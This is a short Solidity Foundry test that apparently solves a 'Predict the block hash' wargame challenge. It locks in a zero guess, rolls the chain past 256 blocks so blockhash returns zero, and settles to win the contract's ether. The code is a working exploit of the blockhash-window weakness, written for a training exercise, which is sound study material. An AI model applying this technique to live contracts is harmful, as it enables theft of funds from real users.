// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "../src/PredictBlockHash.sol";

contract PredictBlockHashTest is Test {
    PredictTheBlockHashChallenge target;
    address player = vm.addr(1);

    function setUp() public {
        target = new PredictTheBlockHashChallenge{value: 1 ether}();
        vm.deal(player, 1 ether);
    }

    function testChallenge() public {
        vm.startPrank(address(player));

        target.lockInGuess{value: 1 ether}(bytes32(uint256(0)));
        vm.roll(block.number + 1 + 257);
        target.settle();

        assertTrue(target.isComplete());
    }
}
